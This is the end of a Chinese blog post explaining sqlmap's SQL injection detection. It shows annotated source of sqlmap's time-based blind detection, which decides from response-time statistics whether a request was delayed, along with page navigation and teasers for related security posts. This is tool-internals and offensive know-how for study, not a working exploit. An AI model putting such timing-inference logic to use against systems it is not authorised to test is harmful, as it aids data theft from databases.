<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">wasLastRequestDelayed</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Returns True if the last web request resulted in a time-delay</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-comment"># 99.9999999997440% of all non time-based sql injection affected</span><br>    <span class="hljs-comment"># response times should be inside +-7*stdev([normal response times])</span><br>    <span class="hljs-comment"># Math reference: http://www.answers.com/topic/standard-deviation</span><br>    deviation = stdev(kb.responseTimes) <span class="hljs-comment"># 计算所有响应时间的标准偏差</span><br>    threadData = getCurrentThreadData()<br><br>    <span class="hljs-keyword">if</span> deviation:<br>        <span class="hljs-comment"># 需要一定数据量，统计结果才有意义</span><br>        <span class="hljs-comment"># MIN_TIME_RESPONSES = 10</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(kb.responseTimes) &lt; MIN_TIME_RESPONSES: <br>            warnMsg = <span class="hljs-string">&quot;time-based standard deviation method used on a model &quot;</span><br>            warnMsg += <span class="hljs-string">&quot;with less than %d response times&quot;</span> % MIN_TIME_RESPONSES<br>            logger.warn(warnMsg)<br><br>        <span class="hljs-comment"># TIME_STDEV_COEFF = 10 必须大于等于7</span><br>        lowerStdLimit = average(kb.responseTimes) + TIME_STDEV_COEFF * deviation<br>        retVal = (threadData.lastQueryDuration &gt;= lowerStdLimit)<br><br>        <span class="hljs-comment"># 如果retVal 为True， 发生Delay，需要调整</span><br>        <span class="hljs-comment"># TIME_DEFAULT_DELAY = 5, kb.testMode sql injection test mode,</span><br>        <span class="hljs-comment"># 用户没用手动更改Delay 时间</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> kb.testMode <span class="hljs-keyword">and</span> retVal <span class="hljs-keyword">and</span> conf.timeSec == TIME_DEFAULT_DELAY:<br>            adjustTimeDelay(threadData.lastQueryDuration, lowerStdLimit)<br><br>        <span class="hljs-keyword">return</span> retVal<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> (threadData.lastQueryDuration - conf.timeSec) &gt;= <span class="hljs-number">0</span><br><br><br><span class="hljs-comment"># length of queue for candidates for time delay adjustment</span><br>TIME_DELAY_CANDIDATES = <span class="hljs-number">3</span><br>kb.delayCandidates = TIME_DELAY_CANDIDATES * [<span class="hljs-number">0</span>]<br>kb.delayCandidates = [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">adjustTimeDelay</span>(<span class="hljs-params">lastQueryDuration, lowerStdLimit</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Adjusts time delay in time-based data retrieval</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    candidate = <span class="hljs-number">1</span> + <span class="hljs-built_in">int</span>(<span class="hljs-built_in">round</span>((<span class="hljs-number">1</span> - (lastQueryDuration - lowerStdLimit) / lastQueryDuration) * conf.timeSec))<br><br>    <span class="hljs-keyword">if</span> candidate:<br>        kb.delayCandidates = [candidate] + kb.delayCandidates[:-<span class="hljs-number">1</span>]<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">all</span>([x == candidate <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> kb.delayCandidates]) <span class="hljs-keyword">and</span> candidate &lt; conf.timeSec:<br>            <span class="hljs-built_in">print</span><br><br>            warnMsg = <span class="hljs-string">&quot;adjusting time delay to %d second%s &quot;</span> % (candidate, <span class="hljs-string">&#x27;s&#x27;</span> <span class="hljs-keyword">if</span> candidate &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;&#x27;</span>)<br>            warnMsg += <span class="hljs-string">&quot;(due to good response times)&quot;</span><br>            logger.warn(warnMsg)<br><br>            conf.timeSec = candidate<br><br></code></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://usmacd.com">曼福吉</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://usmacd.com/cn/sqlmap_sql_injection/">https://usmacd.com/cn/sqlmap_sql_injection/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://usmacd.com" target="_blank">安全代码</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Security/">Security</a></div><div class="post-share"><div class="social-share" data-image="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/cn/chrome_flash_update/" title="Google Chrome 浏览器 Adobe Flash Player 升级"><img class="cover" src="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Google Chrome 浏览器 Adobe Flash Player 升级</div></div><div class="info-2"><div class="info-item-1">某一天突然发现网页中flash已经不能正常显示了（我一般都禁用），显示 out of data 错误。 访问 chrome:&#x2F;&#x2F;components&#x2F; 可以升级 Adobe Flash Player Adobe Flash Player - 检查更新， 失败。这里有一个坑，插件中的代理设置是无法影响chrome 内部程序的，必须设置环境变量或者直接使用命令行来设置全局代理。 google-chrome —proxy-server&#x3D;”socks:&#x2F;&#x2F;127.0.0.1:9999” 重新检查更新，可以成功更新了，重启后生效了，已经不报 out of data 错误了。为了保险把系统中flash player也给升级，打开网页 https://get.adobe.com/flashplayer/otherversions/ step 1 选Linux (64 bit), step 2 选 yum，下载后安装，后续可以使用dnf 升级了。 </div></div></div></a><a class="pagination-related" href="/cn/android_emulator_debug/" title="在虚拟机中调试android 手机的方法"><img class="cover" src="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">在虚拟机中调试android 手机的方法</div></div><div class="info-2"><div class="info-item-1">由于Google的源码是在ubuntu下编译的，Google官方提供了较为详细的编译说明，所以使用 了ubuntu 14.04 进行编译，编译完成后有一个问题，如何进行源码调试。（源代码在虚拟机中） 使用 virutalbox Extension Pack首先的想法是直接使用中virutalBox 的USB 把手机给连到guest，折腾了一下比较麻烦， 首先需要安装virutalbox 的 Extension Pack，下载地址 http://download.virtualbox.org/virtualbox/5.1.18/Oracle_VM_VirtualBox_Extension_Pack-5.1.18-114002.vbox-extpack 管理-&gt;全局设定-&gt;扩展，选择下载的扩展包，安装。接下来这步很关键，上次就是这里没有搞定。 1sudo usermod -a -G vboxusers &lt;username&gt;  执行命令后需要注销，重新登录。 VirtualBox 虚拟机设置 -&gt; usb 添加需要接入 guest 的 usb 设备。 12...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/cn/BankBot/" title="Bankbot APK 样本分析"><img class="cover" src="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-06</div><div class="info-item-2">Bankbot APK 样本分析</div></div><div class="info-2"><div class="info-item-1">0x00 样本概况   字段 内容    样本名 BankBot   MD5 3c42c391bec405bb28b28195c2961778   SHA256 93b64019ee48177889d908c393703a2a2fe05ca33793c14b175467ce619b1b94   文件类型 APK   这是一个以盗窃信用卡用户密码为主要目的的bot。安装后显示为Android图标。打开App后会以Android系统更新的形式，诱导用户操作达到常驻系统的目的。 0x01 行为分析开机自启动123456789101112&lt;receiver android:name=&quot;com.android.market.Autorun&quot;&gt;    &lt;intent-filter android:priority=&quot;999&quot;&gt;        &lt;action android:name=&quot;android.intent.action.REBOOT&quot; /&gt;        &lt;action androi...</div></div></div></a><a class="pagination-related" href="/cn/qemu_kvm/" title="VMware Workstation Windows 10 host Ubuntu 18.04 Guest 中加载 Linux 内核 kvm 模块"><img class="cover" src="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-28</div><div class="info-item-2">VMware Workstation Windows 10 host Ubuntu 18.04 Guest 中加载 Linux 内核 kvm 模块</div></div><div class="info-2"><div class="info-item-1">这里在 VMware Workstation Guset OS 里使用 qemu 的用法，有点像俄罗斯套娃。 qemu.sh 123456789101112qemu-system-x86_64 \  -m 2G \  -smp 2 \  -kernel $KERNEL/arch/x86——64/boot/bzImage \  -append &quot;console=ttyS0 root=/dev/sda earlyprintk=serial net.ifnames=0&quot; \  -drive file=$IMAGE/bullseye.img,format=raw \  -net user,host=10.0.2.10,hostfwd=tcp:127.0.0.1:10021-:22 \  -net nic,model=e1000 \  -enable-kvm \  -nographic \  -pidfile vm.pid \  2&gt;&amp;1 | tee vm.log  执行命令后 bash ./qemu.sh 后报错 12Could not access K...</div></div></div></a><a class="pagination-related" href="/cn/webview_java/" title="Android WebView 漏洞"><img class="cover" src="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-06</div><div class="info-item-2">Android WebView 漏洞</div></div><div class="info-2"><div class="info-item-1">☆ 来自 developer.android.com 的信息Android 官方网站对addJavascriptInterface的介绍如下： 123456789101112public void addJavascriptInterface (Object object, String name)  Added in API level 1Injects the supplied Java object into this WebView. The object is injected intothe JavaScript context of the main frame, using the supplied name. This allows the Java object&#x27;s methods to be accessed from JavaScript. For applicationstargeted to API level JELLY_BEAN_MR1 and above, only public methods that are annotated w...</div></div></div></a><a class="pagination-related" href="/cn/winafl/" title="winafl fuzz 工具的使用"><img class="cover" src="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-23</div><div class="info-item-2">winafl fuzz 工具的使用</div></div><div class="info-2"><div class="info-item-1">0. 下载 Visual Studio Community 2022下载地址：https://aka.ms/vs/17/release/vs_community.exe 从微软网站下载并安装 Visual Studio Community 的时候速度只有2 K，一下午没能下载成功。咨询同事小钻风，指出可能是 DNS 问题，将 DNS 切换成阿里的 DNS 223.5.5.5 后下载速度达到 4 M。中国开发者网络总是个问题，大家都挺不容易的。 1. 编译 winafl 下载 DynamoRIO 解压到 D:\DynamoRIO 下载 cmake 解压到 D:\cmake 从 Github 下载 winafl 编译 intel PT 需要同步 third_party 的源码  123git clone https://github.com/googleprojectzero/winafl.gitcd winaflgit submodule update --init --recursive   从菜单中选择  X64 native tool command prompt for V...</div></div></div></a><a class="pagination-related" href="/cn/android_malware/" title="关于恶意 Android 软件的那些事"><img class="cover" src="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2018-06-05</div><div class="info-item-2">关于恶意 Android 软件的那些事</div></div><div class="info-2"><div class="info-item-1">  近年来，Android手机平台上的恶意App呈不断上升的趋势，根据G DATA的数据仅2015年 第一季度发现了440267 种新的安卓恶意软件，也就是说，全球范围内每18秒就有一个新的恶意软件被发现。而天朝由于Google被封的原因，更是使恶意软件的传播更加猖獗。Google Play store 为了保证Android用户的安全做了大量的努力，和国内的一些第三方应用市场相比安全一些的。    重打包是Android App主流的传播方式之一，和以前单独的恶意App不同，重打包的软件 在合法正常的App中插入恶意代码，迷惑性极强，一般用户觉察不出什么不同。而重打包选取 的App也大多是非常流行的App，如愤怒的小鸟之类,这些都在地下市场隐秘的进行着。重打包 App然后上传第三方App应用市场，第三方市场把关不严格的话，这些插入了恶意代码的App 就可以下载安装了。   除了重打包软件，彩信也是Android 恶意App传播的主要方式，和以前QQ的消息尾巴类似发一些奇怪的话，后面加上短链接。短链接就是经过压缩的链接，没法一些看出原始的链接，点击后会自动下载恶意App。臭名昭著...</div></div></div></a><a class="pagination-related" href="/cn/5cAcessPath/" title="N 谈 %5C 暴库"><img class="cover" src="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2006-07-13</div><div class="info-item-2">N 谈 %5C 暴库</div></div><div class="info-2"><div class="info-item-1">关于%5c的暴库利用想已经不是什么新技术了，原因我只找到含糊的说法：的UNICODE是%5c当提交时,IIS无法正常解析,导致暴库。但我对 http://www.hoky.org 测试成功后（现在已经补上）问过hoky.pro，得知%5c与IIS的设置是有关系的。而在默认设置下是可以暴库的。还有很多人说不成功，我要说的三点：  一般的错误返回页面是本地IE提供的,所以我们先得关了本地的错误页面,具体在菜单项的‘工具-&gt;internet选项-&gt;高级-&gt;显示友好信息’。 对方数据库要是Access型。 %5c的暴库需要的是二级目录，一级目录无法成功。如：  http://www.sometips.com%5c1.asp?id=1 不成功http://www.sometips.com/other%5c1.asp?id=1 成功 好了，上面说的大家都知道，当是废话。在暴库这么好用的东西下，如果一个网站只有一级目录的话，难道就没有办法了吗？说到重点，其实一级目录我们也同样可以成功的，我们可以通过构造一个多级目录来达到暴库的目的。 http://www.target.com...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">曼福吉</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">173</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="/rss.xml" target="_blank" title="RSS"><i class="fas fa-rss" style="color: #4c566a;"></i></a><a class="social-icon" href="https://x.com/henices" target="_blank" title="Twitter"><i class="fab fa-x-twitter" style="color: #4c566a;"></i></a><a class="social-icon" href="mailto:zhouzhenster@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4c566a;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E4%BF%A1%E9%81%93%E7%9A%84-sql-injection-%E5%88%86%E7%B1%BB"><span class="toc-number">1.</span> <span class="toc-text">基于信道的 sql injection 分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Inband"><span class="toc-number">1.1.</span> <span class="toc-text">Inband</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Out-of-band"><span class="toc-number">1.2.</span> <span class="toc-text">Out-of-band</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Inferential"><span class="toc-number">1.3.</span> <span class="toc-text">Inferential</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E-sql-inject-%E6%A3%80%E6%B5%8B%E6%8A%80%E6%9C%AF%E7%9A%84%E5%88%86%E7%B1%BB"><span class="toc-number">2.</span> <span class="toc-text">基于 sql inject 检测技术的分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#boolean-based-blind-SQL-injection"><span class="toc-number">2.1.</span> <span class="toc-text">boolean-based blind SQL injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#error-based-SQL-injection"><span class="toc-number">2.2.</span> <span class="toc-text">error-based SQL injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#time-based-blind-or-stacked-queries"><span class="toc-number">2.3.</span> <span class="toc-text">time-based blind or stacked queries</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UNION-query-SQL-injection"><span class="toc-number">2.4.</span> <span class="toc-text">UNION query SQL injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Stacked-queries-SQL-injection"><span class="toc-number">2.5.</span> <span class="toc-text">Stacked queries SQL injection</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Injection-%E6%A3%80%E6%B5%8B%E7%9A%84%E9%80%83%E9%80%B8%E6%8A%80%E6%9C%AF"><span class="toc-number">3.</span> <span class="toc-text">SQL Injection 检测的逃逸技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%8F%E6%9C%BA%E5%A4%A7%E5%B0%8F%E5%86%99"><span class="toc-number">3.1.</span> <span class="toc-text">随机大小写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E7%94%A8%E6%B3%A8%E9%87%8A%E6%9B%BF%E6%8D%A2"><span class="toc-number">3.2.</span> <span class="toc-text">空格用注释替换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%8F%E6%9C%BA%E6%B3%A8%E9%87%8A"><span class="toc-number">3.3.</span> <span class="toc-text">随机注释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E7%94%A8-%E6%9B%BF%E6%8D%A2"><span class="toc-number">3.4.</span> <span class="toc-text">空格用+替换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%8F%E6%9C%BA%E7%A9%BA%E6%A0%BC%E6%9B%BF%E6%8D%A2"><span class="toc-number">3.5.</span> <span class="toc-text">随机空格替换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#urlencode"><span class="toc-number">3.6.</span> <span class="toc-text">urlencode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#between-%E6%9B%BF%E6%8D%A2"><span class="toc-number">3.7.</span> <span class="toc-text">between 替换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%83%E9%81%BF%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A3%80%E6%B5%8B"><span class="toc-number">3.8.</span> <span class="toc-text">逃避正则表达式检测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DBMS%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF"><span class="toc-number">4.</span> <span class="toc-text">DBMS分析技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E9%94%99%E8%AF%AF%E4%BF%A1%E6%81%AF%E5%88%86%E6%9E%90DBMS"><span class="toc-number">4.1.</span> <span class="toc-text">通过错误信息分析DBMS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A3%80%E6%B5%8BSQL-Injection-%E7%9A%84%E6%8A%A5%E6%96%87"><span class="toc-number">5.</span> <span class="toc-text">检测SQL Injection 的报文</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E5%88%A4%E6%96%ADinjected-payload-%E6%88%90%E5%8A%9F"><span class="toc-number">6.</span> <span class="toc-text">怎么判断injected payload 成功</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#comparison-%E7%AE%97%E6%B3%95%EF%BC%8C-boolean-based-blind-SQL-injections"><span class="toc-number">6.1.</span> <span class="toc-text">comparison 算法， boolean-based blind SQL injections</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#grep-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%EF%BC%8C-error-based-SQL-injection-%E5%8F%AF%E4%BB%A5%E6%A3%80%E6%9F%A5"><span class="toc-number">6.2.</span> <span class="toc-text">grep(正则表达式)， error-based SQL injection, 可以检查</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MySQL-5-0-AND-error-based-WHERE-or-HAVING-clause"><span class="toc-number">6.2.1.</span> <span class="toc-text">MySQL &gt;&#x3D; 5.0 AND error-based - WHERE or HAVING clause</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Microsoft-SQL-Server-Sybase-AND-error-based-WHERE-or-HAVING-clause"><span class="toc-number">6.2.2.</span> <span class="toc-text">Microsoft SQL Server&#x2F;Sybase AND error-based - WHERE or HAVING clause</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PostgreSQL-AND-error-based-WHERE-or-HAVING-clause"><span class="toc-number">6.2.3.</span> <span class="toc-text">PostgreSQL AND error-based - WHERE or HAVING clause</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Oracle-AND-error-based-WHERE-or-HAVING-clause-XMLType"><span class="toc-number">6.2.4.</span> <span class="toc-text">Oracle AND error-based - WHERE or HAVING clause (XMLType)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unionTest-%E5%87%BD%E6%95%B0%EF%BC%8CUNION-query-inband-SQL-injection"><span class="toc-number">6.3.</span> <span class="toc-text">unionTest() 函数，UNION query (inband) SQL injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%93%8D%E5%BA%94%E6%97%B6%E9%97%B4-time-based-blind-and-stacked-queries-SQL-injections"><span class="toc-number">6.4.</span> <span class="toc-text">基于响应时间, time-based blind and stacked queries SQL injections</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/cn/gemini_in_chrome/" title="开启 Gemini in Chrome 的方法">开启 Gemini in Chrome 的方法</a><time datetime="2026-01-29T16:00:00.000Z" title="发表于 2026-01-30 00:00:00">2026-01-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/cn/sucess_is_the_mother_of_sucess/" title="成功是成功之母">成功是成功之母</a><time datetime="2026-01-27T16:00:00.000Z" title="发表于 2026-01-28 00:00:00">2026-01-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/cn/ai_studio_podcast_transcript/" title="利用 AI Studio 整理播客音频的逐字稿">利用 AI Studio 整理播客音频的逐字稿</a><time datetime="2026-01-07T16:00:00.000Z" title="发表于 2026-01-08 00:00:00">2026-01-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/cn/anti-weakness-learning/" title="反脆弱式的学习方法">反脆弱式的学习方法</a><time datetime="2025-12-30T16:00:00.000Z" title="发表于 2025-12-31 00:00:00">2025-12-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/cn/keep_hard/" title="坚持的秘诀">坚持的秘诀</a><time datetime="2025-12-15T16:00:00.000Z" title="发表于 2025-12-16 00:00:00">2025-12-16</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By 曼福吉</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><script src="/js/tw_cn.js?v=5.5.4"></script><div class="js-pjax"><script>(() => {
  const parseViewBox = viewBox => {
    if (!viewBox) return null
    const parts = viewBox.trim().split(/[\s,]+/).map(n => Number(n))
    if (parts.length !== 4 || parts.some(n => Number.isNaN(n))) return null
    return parts
  }

  const getSvgViewBox = svg => {
    const attr = parseViewBox(svg.getAttribute('viewBox'))
    if (attr) return attr

    // Fallback: use bbox to build a viewBox
    try {
      const bbox = svg.getBBox()
      if (bbox && bbox.width && bbox.height) return [bbox.x, bbox.y, bbox.width, bbox.height]
    } catch (e) {
      // getBBox may fail on some edge cases; ignore
    }

    const w = Number(svg.getAttribute('width')) || 0
    const h = Number(svg.getAttribute('height')) || 0
    if (w > 0 && h > 0) return [0, 0, w, h]
    return [0, 0, 100, 100]
  }

  const setSvgViewBox = (svg, vb) => {
    svg.setAttribute('viewBox', `${vb[0]} ${vb[1]} ${vb[2]} ${vb[3]}`)
  }

  const clamp = (v, min, max) => Math.max(min, Math.min(max, v))

  const openSvgInNewTab = ({ source, initViewBox }) => {
    const getClonedSvg = () => {
      if (typeof source === 'string') {
        const template = document.createElement('template')
        template.innerHTML = source.trim()
        const svg = template.content.querySelector('svg')
        return svg ? svg.cloneNode(true) : null
      }
      if (source && typeof source.cloneNode === 'function') {
        return source.cloneNode(true)
      }
      return null
    }

    const clone = getClonedSvg()
    if (!clone) return
    if (initViewBox && initViewBox.length === 4) {
      clone.setAttribute('viewBox', initViewBox.join(' '))
    }
    if (!clone.getAttribute('xmlns')) clone.setAttribute('xmlns', 'http://www.w3.org/2000/svg')
    if (!clone.getAttribute('xmlns:xlink') && clone.outerHTML.includes('xlink:')) {
      clone.setAttribute('xmlns:xlink', 'http://www.w3.org/1999/xlink')
    }
    // inject background to match current theme
    const isDark = document.documentElement.getAttribute('data-theme') === 'dark'
    const bg = getComputedStyle(document.body).backgroundColor || (isDark ? '#1e1e1e' : '#ffffff')
    if (!clone.style.background) clone.style.background = bg

    const serializer = new XMLSerializer()
    const svgSource = serializer.serializeToString(clone)
    const htmlSource = `<!doctype html><html><head><meta charset="utf-8" />
      <style>
        html, body { width: 100%; height: 100%; margin: 0; display: flex; align-items: center; justify-content: center; background: ${bg}; }
        svg { max-width: 100%; max-height: 100%; height: auto; width: auto; }
      </style>
      </head><body>${svgSource}</body></html>`
    const blob = new Blob([htmlSource], { type: 'text/html;charset=utf-8' })
    const url = URL.createObjectURL(blob)
    window.open(url, '_blank', 'noopener')
    setTimeout(() => URL.revokeObjectURL(url), 30000)
  }

  const attachMermaidViewerButton = wrap => {
    let btn = wrap.querySelector('.mermaid-open-btn')
    if (!btn) {
      btn = document.createElement('button')
      btn.type = 'button'
      btn.className = 'mermaid-open-btn'
      wrap.appendChild(btn)
    }

    btn.innerHTML = '<i class="fa fa-search fa-fw" aria-hidden="true"></i>'

    if (!btn.__mermaidViewerBound) {
      btn.addEventListener('click', e => {
        e.preventDefault()
        e.stopPropagation()
        const svg = wrap.__mermaidOriginalSvg || wrap.querySelector('svg')
        if (!svg) return
        const initViewBox = wrap.__mermaidInitViewBox
        if (typeof svg === 'string') {
          openSvgInNewTab({ source: svg, initViewBox })
          return
        }
        openSvgInNewTab({ source: svg, initViewBox })
      })
      btn.__mermaidViewerBound = true
    }
  }

  // Zoom around a point (px, py) in the SVG viewport (in viewBox coordinates)
  const zoomAtPoint = (vb, factor, px, py) => {
    const w = vb[2] * factor
    const h = vb[3] * factor
